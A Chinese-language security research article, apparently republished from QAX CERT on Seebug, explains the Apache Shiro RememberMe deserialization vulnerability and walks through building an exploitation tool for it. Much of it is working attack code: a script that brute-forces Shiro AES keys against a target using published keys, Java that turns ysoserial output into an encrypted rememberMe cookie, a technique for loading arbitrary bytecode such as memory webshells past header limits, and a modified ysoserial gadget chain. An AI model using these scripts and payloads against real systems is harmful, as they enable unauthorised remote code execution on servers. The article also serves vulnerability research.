**作者：Veraxy@QAX CERT  
原文链接：<https://mp.weixin.qq.com/s/WDmj4-2lB-hlf_Fm_wDiOg>**

Apache Shiro是一个强大且易用的Java安全框架，执行身份验证、授权、密码和会话管理。目前在Java
web应用安全框架中，最热门的产品有Spring
Security和Shiro，二者在核心功能上几乎差不多，但Shiro更加轻量级，使用简单、上手更快、学习成本低，所以Shiro的使用量一直高于Spring
Security。产品用户量之高，一旦爆发漏洞波及范围相当广泛，研究其相关漏洞很有必要，本文主要探讨Shiro反序列化漏洞利用思路及工具编写，如有不足之处，欢迎批评指正。

# 0x01Shiro反序列化漏洞

## **漏洞原理**

Apache
Shiro框架提供了记住我的功能（RememberMe），用户登陆成功后会生成经过加密并编码的cookie，在服务端接收cookie值后，Base64解码-->AES解密-->反序列化。攻击者只要找到AES加密的密钥，就可以构造一个恶意对象，对其进行序列化-->AES加密-->Base64编码，然后将其作为cookie的rememberMe字段发送，Shiro将rememberMe进行解密并且反序列化，最终造成反序列化漏洞。

Shiro 1.2.4版本默认固定密钥：

![图片](https://images.seebug.org/content/images/2021/03/12/1615523068000-1kqfua.png-w331s)

**Shiro框架默认指纹特征** ：

在请求包的Cookie中为?rememberMe字段赋任意值，收到返回包的 Set-Cookie
中存在?rememberMe=deleteMe?字段，说明目标有使用Shiro框架，可以进一步测试。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523068000-2bojbm.png-w331s)

# 0x02 **漏洞利用**

## **2.1 AES密钥**

Shiro
1.2.4及之前的版本中，AES加密的密钥默认硬编码在代码里（[SHIRO-550](https://issues.apache.org/jira/browse/SHIRO-550)），Shiro
1.2.4以上版本官方移除了代码中的默认密钥，要求开发者自己设置，如果开发者没有设置，则默认动态生成，降低了固定密钥泄漏的风险。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523068000-3pxtei.png-w331s)

有很多开源的项目内部集成了shiro并二次开发，可能会重现低版本shiro的默认固定密钥风险。例如[Guns开源框架](https://github.com/stylefeng/Guns)内部集成了shiro并进行二次开发，作者自定义密钥并固定，此时用户若不对密钥进行修改，即使升级shiro版本，也依旧存在固定密钥的风险。([相关issues地址](https://github.com/stylefeng/Guns/issues/48)：https://github.com/stylefeng/Guns/issues/48)

![图片](https://images.seebug.org/content/images/2021/03/12/1615523069000-4rcdmj.png-w331s)

开发者在使用shiro时通常会找一些教程来帮助快速搭建，针对教程中自定义的密钥未修改就直接copy过来的情况也比较常见。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523069000-5mdwuz.png-w331s)

经过以上分析，升级shiro版本并不能根本解决反序列化漏洞，代码复用会直接导致项目密钥泄漏，从而造成反序列化漏洞。针对公开的密钥集合，我们可以在github上搜索到并加以利用。【搜索关键词："securityManager.setRememberMeManager(rememberMeManager);
Base64.decode("或"setCipherKey(Base64.decode("】

![图片](https://images.seebug.org/content/images/2021/03/12/1615523070000-6ofkjn.png-w331s)

## **2.2 目标AES密钥判断**

收集到了密钥集合，接下来要对目标进行密钥判断，我们如何获知选择的密钥是否与目标匹配呢？文章[一种另类的 shiro
检测方式](https://mp.weixin.qq.com/s/do88_4Td1CSeKLmFqhGCuQ)提供了思路，当密钥不正确或类型转换异常时，目标Response包含Set-Cookie：rememberMe=deleteMe字段，而当密钥正确且没有类型转换异常时，返回包不存在Set-Cookie：rememberMe=deleteMe字段。接下来对这两种情况简单分析一下：

**1）密钥不正确**

Key不正确，解密时org.apache.shiro.crypto.JcaCipherService#crypt抛出异常

![图片](https://images.seebug.org/content/images/2021/03/12/1615523070000-7xyfet.png-w331s)

进而走进org.apache.shiro.web.servlet.impleCookie#removeFrom方法，在返回包中添加了rememberMe=deleteMe字段

![图片](https://images.seebug.org/content/images/2021/03/12/1615523070000-8ksewu.png-w331s)

于是获得的返回包包含了Set-Cookie：rememberMe=deleteMe字段。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523070000-9avbko.png-w331s)

**2）类型转换异常**

org.apache.shiro.mgt.AbstractRememberMeManager#deserialize进行数据反序列化，返回结果前有对反序列化结果对象做PrincipalCollection的强制类型转换。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523071000-10ejzls.png-w331s)

可以看到类型转换报错，因为我们的反序列化结果对象与PrincipalCollection并没有继承关系

![图片](https://images.seebug.org/content/images/2021/03/12/1615523071000-11nrxrd.png-w331s)

反序列化方法捕获到该异常，后面是熟悉的代码

![图片](https://images.seebug.org/content/images/2021/03/12/1615523071000-12vrwhz.png-w331s)

再次走到org.apache.shiro.web.servlet.SimpleCookie#removeFrom方法，为返回包添加了rememberMe=deleteMe字段

![图片](https://images.seebug.org/content/images/2021/03/12/1615523071000-13pdpvg.png-w331s)

获得与第一种情况一样的返回包。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523072000-14hahgr.png-w331s)

根据上面的分析，我们需要构造payload排除类型转换错误，进而准确判断密钥。当序列化对象继承PrincipalCollection时，类型转换正常，SimplePrincipalCollection是已存在的可利用类。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523073000-15tuani.png-w331s)

创建一个SimplePrincipalCollection对象并将其序列化。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523074000-16ktkpu.png-w331s)

将序列化数据基于key进行AES加密并base64编码发起请求，当返回包不存在Set-Cookie：rememberMe=deleteMe字段时，说明密钥与目标匹配。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523074000-17bswjx.png-w331s)

## **2.3 密钥判断脚本**

shiro在1.4.2版本之前， AES的模式为CBC，
IV是随机生成的，并且IV并没有真正使用起来，所以整个AES加解密过程的key就很重要了，正是因为AES使用Key泄漏导致反序列化的cookie可控，从而引发反序列化漏洞。在1.4.2版本后，shiro已经更换加密模式
AES-CBC为 AES-GCM，脚本编写时需要考虑加密模式变化的情况。

密钥集合我这里简单列举了几个，网上流传大量现成的Shiro key top 100集合，请自行查找替换。密钥判断脚本如下：

    
    
    import base64
    import uuid
    import requests
    from Crypto.Cipher import AES
    
    def encrypt_AES_GCM(msg, secretKey):
        aesCipher = AES.new(secretKey, AES.MODE_GCM)
        ciphertext, authTag = aesCipher.encrypt_and_digest(msg)
        return (ciphertext, aesCipher.nonce, authTag)
    
    def encode_rememberme(target):
        keys = ['kPH+bIxk5D2deZiIxcaaaA==', '4AvVhmFLUs0KTA3Kprsdag==','66v1O8keKNV3TTcGPK1wzg==', 'SDKOLKn2J1j/2BHjeZwAoQ==']     # 此处简单列举几个密钥
        BS = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        mode = AES.MODE_CBC
        iv = uuid.uuid4().bytes
    
        file_body = base64.b64decode('rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA==')
        for key in keys:
            try:
                # CBC加密
                encryptor = AES.new(base64.b64decode(key), mode, iv)
                base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(file_body)))
                res = requests.get(target, cookies={'rememberMe': base64_ciphertext.decode()},timeout=3,verify=False, allow_redirects=False)
                if res.headers.get("Set-Cookie") == None:
                    print("正确KEY ：" + key)
                    return key
                else:
                    if 'rememberMe=deleteMe;' not in res.headers.get("Set-Cookie"):
                        print("正确key:" + key)
                        return key
                # GCM加密
                encryptedMsg = encrypt_AES_GCM(file_body, base64.b64decode(key))
                base64_ciphertext = base64.b64encode(encryptedMsg[1] + encryptedMsg[0] + encryptedMsg[2])
                res = requests.get(target, cookies={'rememberMe': base64_ciphertext.decode()}, timeout=3, verify=False, allow_redirects=False)
    
                if res.headers.get("Set-Cookie") == None:
                    print("正确KEY:" + key)
                    return key
                else:
                    if 'rememberMe=deleteMe;' not in res.headers.get("Set-Cookie"):
                        print("正确key:" + key)
                        return key
                print("正确key:" + key)
                return key
            except Exception as e:
                print(e)

## **2.4 利用复现**

服务端接收rememberMe的cookie值后的操作是：Cookie中rememberMe字段内容 ---> Base64解密 --->
使用密钥进行AES解密 --->反序列化，我们要构造POC就需要先序列化数据然后再AES加密最后base64编码。

**1） 构造序列化数据**

下载ysoserial工具并打包：

    
    
    git clone https://github.com/frohoff/ysoserial.git
    cd ysoserial
    mvn package -DskipTests

生成的工具在target/目录下ysoserial-0.0.6-SNAPSHOT-all.jar文件，借助ysoserial工具生成序列化数据：

![图片](https://images.seebug.org/content/images/2021/03/12/1615523075000-18ceuhj.png-w331s)

**2） 获取AES加密的密钥Key**

利用上文中编写的脚本来获取真实密钥。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523075000-19gajrf.png-w331s)

**3） 生成rememberMe字段Payload**

前两步得到了序列化数据和正确密钥，对序列化数据基于密钥进行AES加密，base64编码生成payload，代码如下：

    
    
    package com.veraxy;
    
    import org.apache.shiro.crypto.AesCipherService;
    import org.apache.shiro.codec.CodecSupport;
    import org.apache.shiro.util.ByteSource;
    import org.apache.shiro.codec.Base64;
    import java.io.BufferedWriter;
    import java.io.FileWriter;
    import java.nio.file.FileSystems;
    import java.nio.file.Files;
    
    public class ShiroRememberMeGenPayload {
        public static void main(String[] args) throws Exception {
            byte[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath("xxx/xxx/test.ser"));
    
            AesCipherService aes = new AesCipherService();
            byte[] key = Base64.decode(CodecSupport.toBytes("kPH+bIxk5D2deZiIxcaaaA=="));
    
            ByteSource ciphertext = aes.encrypt(payloads, key);
            BufferedWriter out = new BufferedWriter(new FileWriter("payload.txt"));
            out.write(ciphertext.toString());
            out.close();
            System.out.printf("OK");
    
        }
    }

将payload添加至Cookie中的rememberMe字段值发起请求，成功反序列化对象并执行命令。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523076000-20rlrkc.png-w331s)

# 0x03 **进一步利用**

## **3.1 Payload长度限制**

简单分析一条TemplatesImpl的反序列化利用链CommonsBeanutils1，利用ysoserial工具生成序列化对象时，键入了一条命令，在getObject方法中接收command参数

![图片](https://images.seebug.org/content/images/2021/03/12/1615523076000-21pokwa.png-w331s)

跟进createTemplatesImpl方法，找到了实际执行的代码，插入了java.lang.Runtime.getRuntime().exec()来执行命令，那我们替换cmd参数值就可以执行任何代码，比如内存马

![图片](https://images.seebug.org/content/images/2021/03/12/1615523076000-22fgutr.png-w331s)

shiro反序列化漏洞常规利用点在数据包的header头中，在这里直接插入目标代码，生成的payload是很长的，肯定会超过中间件 header
长度限制，如何解决这个问题呢？

文章[Java代码执行漏洞中类动态加载的应用](https://mp.weixin.qq.com/s?__biz=MzAwNzk0NTkxNw==&mid=2247484622&idx=1&sn=8ec625711dcf87f0b6abe67483f0534d&chksm=9b772f1cac00a60aa465a54bd00751c563f2125c78cc1bbca35c760236e4f67d00671de4496c&scene=126&sessionid=1599445076&key=acec999da27edd25eccc957924f4afa7028aec867e42231763ca219c4505e3d6435f346a8463866e7dc0c19a39a3e0600c538e7202ced833a90e6b7910c12b1859ceeaf33f7222bbee4c2acf2953d8dadf304092bebf5d852fbef62087d185eeae0dc9ee37dcd1e02065ea59869b19c78590fb273ffc696c8a9e08793220b82a&ascene=1&uin=NzUwNTE0NzE4&devicetype=Windows+10+x64&version=62090529&lang=zh_CN&exportkey=A%2FH1km1FzCFyhVMsg9e0Izc%3D&pass_ticket=q0CeoTXZ1bV6z466jICgYA%2ByITdSiD5C8i%2FcAgax7OYgTP7U4OVpwP0Xt5Mdan2e&wx_header=0)提供了思路，将要加载的字节码放到post请求携带的data数据包中，header头中的payload仅仅实现读取和加载外部字节码的功能，接下来动手操作：

1）打开ysoserial源码，pom文件中添加依赖：

![图片](https://images.seebug.org/content/images/2021/03/12/1615523077000-23slaky.png-w331s)

2）自定义ClassLoader，获取上下文request中传入的参数值，并实现动态加载外部字节码。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523077000-24hmczp.png-w331s)

重载createTemplatesImpl方法，参数设置为要让服务端加载的类，_bytecodes参数携带要加载的目标类字节码

![图片](https://images.seebug.org/content/images/2021/03/12/1615523077000-25rxhfp.png-w331s)

修改该payload的getObject方法，让createTemplatesImpl方法加载我们自定义的ClassLoader

![图片](https://images.seebug.org/content/images/2021/03/12/1615523078000-26lieyl.png-w331s)

重新打包ysoserial，生成序列化数据

![图片](https://images.seebug.org/content/images/2021/03/12/1615523078000-27vklpv.png-w331s)

拿出上文中写好的生成rememberMe字段Payload的脚本，基于ysoserial生成的序列化数据和已知key生成Payload，作为请求包Cookie中rememberMe的参数值。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523078000-28ykbwm.png-w331s)

接下来需要在POST请求包携带的data数据中插入要加载的字节码，这里选择延时代码进行测试：

    
    
    public class SleepTest {
        static{
            try {
                long aaa = 20000;
                Thread.currentThread().sleep(aaa);
            } catch (Exception e) {
            }
        }
    }

将目标类编译并base64之后作为c的参数值发起请求，看到系统执行了延时代码。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523079000-29wxcue.png-w331s)

接下来就可以根据具体需求替换c的参数值了，比如内存马等其他体积庞大的字节码数据。

## **3.2 SUID不匹配**

反序列时, 如果字节流中的serialVersionUID与目标服务器对应类中的serialVersionUID不同时就会出现异常，造成反序列化失败。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523079000-30cnxtq.png-w331s)

SUID不同是jar包版本不同所造成，不同版本jar包可能存在不同的计算方式导致算出的SUID不同，这种情况下只需要基于目标一样的jar包版本去生成payload即可解决异常，进而提升反序列化漏洞利用成功率。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523079000-31xfuhu.png-w331s)

由于不知道目标服务器的依赖版本,
所以只有使用该依赖payload对所有版本目标进行测试，确认payload版本覆盖程度，排除SUID不匹配异常后，得到可利用payload集合。

# 0x04 **工具编写**

师傅们一再强调Shiro本身不存在可利用链，反序列化漏洞可被利用的原因是部署Shiro的网站引入了可利用的依赖包，所以思维不能局限于Shiro本身，它只是个切入点，而可利用链还要进一步确认。

## **4.1 大概思路**

完全不出网的场景，一些需要出网的gadget就暂时不考虑了，常见的TemplatesImpl的反序列化利用链有CommonsBeanutils1、CommonsCollections4、CommonsCollections10、Hibernate1、Jdk7u21。

**1）确认SUID不匹配的版本**

比如Hibernate1中SUID不匹配的问题就比较常见

**payload** **版本** | **适用目标依赖版本** |  
---|---|---  
hibernate-core 4.2.21.Final | 4.2.11.Final- 4.2.21.Final |  
hibernate-core 4.3.11.Final | 4.3.5.Final- 4.3.11.Final |  
hibernate-core 5.0.0.Final | 5.0.0.Final |  
hibernate-core 5.0.1.Final | 5.0.1.Final- 5.0.3.Final |  
hibernate-core 5.0.7.Final | 5.0.7.Final- 5.0.12.Final |  
hibernate-core 5.1.0.Final | 5.1.0.Final- 5.1.17.Final |  
hibernate-core 5.2.0.Final | 5.2.0.Final- 5.2.8.Final |  
hibernate-core 5.2.9.Final | 5.2.9.Final - 5.2.18.Final、5.3.0.Final -5.3.18.Final、5.4.0.Final - 5.4.3.Final |  
hibernate-core 5.4.4.Final | 5.4.4.Final- 5.4.21.Final |  
  
每个链基于确认好的版本分别生成序列化数据做积累，随后用脚本遍历这些序列化数据生成payload，对目标进行依赖和版本探测。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523079000-32upxpi.png-w331s)

**2）探测并生成可用payload**

把上文写的爆破密钥的脚本集成进来，先确认目标的真实密钥，随后在POST请求包携带的data数据中插入延时代码，遍历积累的序列化数据作为POST请求包Cookie字段中rememberMe参数值，探测目标存在的利用链及依赖版本。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523080000-33udfkp.png-w331s)

运行启动脚本，随着不断的探测，命令行界面输出目标真实密钥和适配目标可用的payload，根据提示把可用payload粘贴到请求包Cookie字段。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523080000-34irqid.png-w331s)

参考前文利用复现的流程，修改POST请求包，用生成的Payload填充Cookie字段中rememberMe参数值，POST请求包携带的data数据中添加c参数，参数值自选，比如我这里仍旧插入延时探测的字节码。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523079000-29wxcue.png-w331s)

## **4.2 尝试优化**

上文提到利用链多个版本的序列化数据需要手动生成，耗时耗力，萌生了优化生成多版本序列化数据的过程并集成至工具中的想法。

我们想要实现ysoserial工具每个利用链批量化的基于多个版本的依赖生成payload，降低人力消耗。例如ysoserial中的工具链CommonsBeanutils1分别基于1.9.2版本和1.8.3版本生成payload，ysoserial-0.0.6-SNAPSHOT-all.jar开放版本参数来生成指定版本的payload：

    
    
    Java -jar ysoserial-0.0.6-SNAPSHOT-all.jar   CommonsBeanutils1 cb-1.9.2 “Calc”
    Java -jar ysoserial-0.0.6-SNAPSHOT-all.jar   CommonsBeanutils1 cb-1.8.3 “Calc”

maven打包工具jar时，pom文件同时加载多个版本依赖会产生版本冲突，如何实现设想呢？可以尝试自定义类加载器(ClassLoader)动态加载外部依赖，从而摆脱maven打包时依赖版本冲突的限制。

Java提供给我们一个自定义ClassLoader的工具类URLClassLoader，专门用于加载本地或网络的?class
或jar文件，例如想要加载本地磁盘上的类：

    
    
    public static void main(String[] args) throws Exception{
      File file = new File("d:/");
      URI uri = file.toURI();
      URL url = uri.toURL();
    URLClassLoader classLoader = new URLClassLoader(new URL[]{url});    Class aClass = classLoader.loadClass("com.veraxy.Demo");
       Object obj = aClass.newInstance();
     }

接下来动手修改ysoserial，打开ysoserial源码。

1）编写自定义UrlClassLoaderUtils工具类，加载指定位置外部依赖。

    
    
    package ysoserial;
    
    import java.io.File;
    import java.net.URL;
    import java.net.URLClassLoader;
    
    public class UrlClassLoaderUtils {
        public URLClassLoader urlClassLoader;
        public URLClassLoader loadJar(String gadgetName) throws Exception {
            File[] jarspath = getJarsPath(gadgetName);
            try{
                for(File jar : jarspath){
                    URL url = jar.toURI().toURL();
                    urlClassLoader = new URLClassLoader(new URL[]{url});
                }
            }catch(Exception e){
                System.out.println("加载jar出错！"+e);
            }
            return urlClassLoader;
        }
    
        public File[] getJarsPath(String gadgetName){
            String basePath = System.getProperty("user.dir")+ File.separator+"lib"+File.separator;
            String directoryPath = basePath + gadgetName;
            File directory = new File(directoryPath);
            File[] jars = directory.listFiles();
            return jars;
        }
    
        public static void main(String[] args) throws Exception {
            String gadgetName = "hibernate5";
            UrlClassLoaderUtils u = new UrlClassLoaderUtils();
            Class a = u.loadJar(gadgetName).loadClass("org.hibernate.tuple.component.AbstractComponentTuplizer");
        }
    }

2）修改工具链，使用自定义的UrlClassLoaderUtils工具类加载外部依赖的方式实现，这里以工具链CommonsCollections10为例。

    
    
    package ysoserial.payloads;
    
    import ysoserial.Deserializer;
    import ysoserial.Serializer;
    import ysoserial.payloads.util.Gadgets;
    import ysoserial.payloads.util.PayloadRunner;
    import ysoserial.payloads.util.Reflections;
    import ysoserial.UrlClassLoaderUtils;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.Field;
    import java.net.URLClassLoader;
    import java.util.HashMap;
    import java.util.HashSet;
    import java.util.Map;
    
    public class CommonsCollections10_ClassLoader_plus extends PayloadRunner implements ObjectPayload<HashSet> {
        private Class InvokerTransformer = null;
        private Class LazyMap = null;
        private Class TiedMapEntry = null;
        private Class Transformer = null;
    
        public CommonsCollections10_ClassLoader_plus(URLClassLoader urlClassLoader) throws Exception{
            this.Transformer = urlClassLoader.loadClass("org.apache.commons.collections.Transformer");
            this.InvokerTransformer = urlClassLoader.loadClass("org.apache.commons.collections.functors.InvokerTransformer");
            this.LazyMap = urlClassLoader.loadClass("org.apache.commons.collections.map.LazyMap");
            this.TiedMapEntry = urlClassLoader.loadClass("org.apache.commons.collections.keyvalue.TiedMapEntry");
        }
    
    
        public HashSet getObject(String command) throws Exception
        {
            Object templates = Gadgets.createTemplatesImpl(command);
            Constructor constructorinvokertransformer = this.InvokerTransformer.getDeclaredConstructor(String.class,Class[].class,Object[].class);
            constructorinvokertransformer.setAccessible(true);
            Object transformer = constructorinvokertransformer.newInstance("toString",new Class[0], new Object[0]);
    
            Map innerMap = new HashMap();
    
            Constructor constructorlazymap = this.LazyMap.getDeclaredConstructor(Map.class,this.Transformer);
            HashMap innermap = new HashMap();
            constructorlazymap.setAccessible(true);
            Object lazyMap =  constructorlazymap.newInstance(innermap,transformer);
    
            Constructor constructortidemapentry = this.TiedMapEntry.getConstructor(Map.class,Object.class);
            constructortidemapentry.setAccessible(true);
            Object entry = constructortidemapentry.newInstance(lazyMap,templates);
    
            HashSet map = new HashSet(1);
            map.add("foo");
            Field f = null;
            try
            {
                f = HashSet.class.getDeclaredField("map");
            }
            catch (NoSuchFieldException e)
            {
                f = HashSet.class.getDeclaredField("backingMap");
            }
            Reflections.setAccessible(f);
            HashMap innimpl = null;
            innimpl = (HashMap)f.get(map);
    
            Field f2 = null;
            try
            {
                f2 = HashMap.class.getDeclaredField("table");
            }
            catch (NoSuchFieldException e)
            {
                f2 = HashMap.class.getDeclaredField("elementData");
            }
            Reflections.setAccessible(f2);
            Object[] array = new Object[0];
            array = (Object[])f2.get(innimpl);
            Object node = array[0];
            if (node == null) {
                node = array[1];
            }
            Field keyField = null;
            try
            {
                keyField = node.getClass().getDeclaredField("key");
            }
            catch (Exception e)
            {
                keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
            }
            Reflections.setAccessible(keyField);
            keyField.set(node, entry);
            Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
    
            return map;
        }
    
        public static void main(String[] args) throws Exception
        {
            PayloadRunner.run(CommonsCollections10_ClassLoader_plus.class, args);
        }
    }

3）下载多版本依赖到本地

我编写的UrlClassLoaderUtils工具类中，是指定遍历加载项目根目录下lib中的依赖，接下来需要手动下载工具链相关依赖到本地lib目录下，并按版本分别归类文件夹。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523081000-36waxiw.png-w331s)

4）修改ysoserial启动类GeneratePayload，实例化UrlClassLoaderUtils工具类，开放指定要加载的依赖版本的参数。

    
    
    package ysoserial;
    
    import java.io.PrintStream;
    import java.lang.reflect.Constructor;
    import java.net.URLClassLoader;
    import java.util.*;
    
    import ysoserial.payloads.ObjectPayload;
    import ysoserial.payloads.ObjectPayload.Utils;
    import ysoserial.payloads.annotation.Authors;
    import ysoserial.payloads.annotation.Dependencies;
    import ysoserial.UrlClassLoaderUtils;
    
    @SuppressWarnings("rawtypes")
    public class GeneratePayload {
        private static final int INTERNAL_ERROR_CODE = 70;
        private static final int USAGE_CODE = 64;
    
        public static void main(final String[] args) {
            if (args.length != 3) {
                printUsage();
                System.exit(USAGE_CODE);
            }
            final String payloadType = args[0];
            final String command = args[1];
            final String version = args[2];
    
            final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
            System.out.println(payloadClass);
            if (payloadClass == null) {
                System.err.println("Invalid payload type '" + payloadType + "'");
                printUsage();
                System.exit(USAGE_CODE);
                return; // make null analysis happy
            }
    
            try {
                UrlClassLoaderUtils classLoaderUtils = new UrlClassLoaderUtils();
                Constructor<? extends ObjectPayload<?>> classConstructor = (Constructor<? extends ObjectPayload<?>>) payloadClass.getDeclaredConstructor(URLClassLoader.class);
                ObjectPayload<?> payload = classConstructor.newInstance(classLoaderUtils.loadJar(version));
                final Object object = payload.getObject(command);
                PrintStream out = System.out;
                Serializer.serialize(object, out);
                ObjectPayload.Utils.releasePayload(payload, object);
            } catch (Throwable e) {
                System.err.println("Error while generating or serializing payload");
                e.printStackTrace();
                System.exit(INTERNAL_ERROR_CODE);
            }
            System.exit(0);
        }
    
        private static void printUsage() {
            System.err.println("Y SO SERIAL?");
            System.err.println("Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'");
            System.err.println("  Available payload types:");
    
            final List<Class<? extends ObjectPayload>> payloadClasses =
                new ArrayList<Class<? extends ObjectPayload>>(ObjectPayload.Utils.getPayloadClasses());
            Collections.sort(payloadClasses, new Strings.ToStringComparator()); // alphabetize
    
            final List<String[]> rows = new LinkedList<String[]>();
            rows.add(new String[] {"Payload", "Authors", "Dependencies"});
            rows.add(new String[] {"-------", "-------", "------------"});
            for (Class<? extends ObjectPayload> payloadClass : payloadClasses) {
                 rows.add(new String[] {
                    payloadClass.getSimpleName(),
                    Strings.join(Arrays.asList(Authors.Utils.getAuthors(payloadClass)), ", ", "@", ""),
                    Strings.join(Arrays.asList(Dependencies.Utils.getDependenciesSimple(payloadClass)),", ", "", "")
                });
            }
    
            final List<String> lines = Strings.formatTable(rows);
    
            for (String line : lines) {
                System.err.println("     " + line);
            }
        }
    }

5) 打包ysoserial为工具jar，与lib目录同级，这里指定加载commons-collections-3.2.jar依赖并生成payload。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523082000-37jtglx.png-w331s)

6）ysoserial修改好了，接下来将其集成至Python工具中，将lib依赖包和ysoserial-0.0.6-SNAPSHOT-all.jar搬进去，代码中添加执行ysoserial-0.0.6-SNAPSHOT-all.jar批量生成基于多个版本依赖的序列化数据脚本，此时执行脚本即可自动生成多个版本的序列化数据，节省部分人力。

![图片](https://images.seebug.org/content/images/2021/03/12/1615523082000-38hqydo.png-w331s)

若不需要集成ysoserial-0.0.6-SNAPSHOT-all.jar至工具中，仅仅为了生成序列化数据，可以借鉴[Generate all
unserialize payload via
serialVersionUID](http://www.yulegeyu.com/2019/04/01/Generate-all-unserialize-payload-via-serialVersionUID/)文章中的Generate
payload脚本，通过修改classpath来实现加载不同版本的jar包，看起来效果还不错。（文章地址：http://www.yulegeyu.com/2019/04/01/Generate-all-unserialize-payload-via-serialVersionUID/）

![图片](https://images.seebug.org/content/images/2021/03/12/1615523082000-39omnbi.png-w331s)

# 0x05 **总结**

本文对Shiro反序列化漏洞进行简单分析，主要集中在漏洞利用部分，以编写利用工具为主线，提出问题寻找解决方案，以及遇到的一些限制和提升攻击成功率的措施，后期尝试优化基于多个版本生成序列化数据的过程，修改ysoserial源码，自定义类加载器动态加载外部jar，坑比较多，但确实可行，如果大家有更好的解决方案，欢迎一起交流学习。

# 0x06 **参考文献**

<http://shiro.apache.org/configuration.html>

<https://issues.apache.org/jira/browse/SHIRO-550>

<https://github.com/stylefeng/Guns>

<https://mp.weixin.qq.com/s/do88_4Td1CSeKLmFqhGCuQ>

<https://mp.weixin.qq.com/s/5iYyRGnlOEEIJmW1DqAeXw>

<http://www.yulegeyu.com/2019/04/01/Generate-all-unserialize-payload-via-serialVersionUID/>

<https://www.sohu.com/a/284726504_727010>

<https://blog.csdn.net/qq_36640744/article/details/80093557>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1503/>

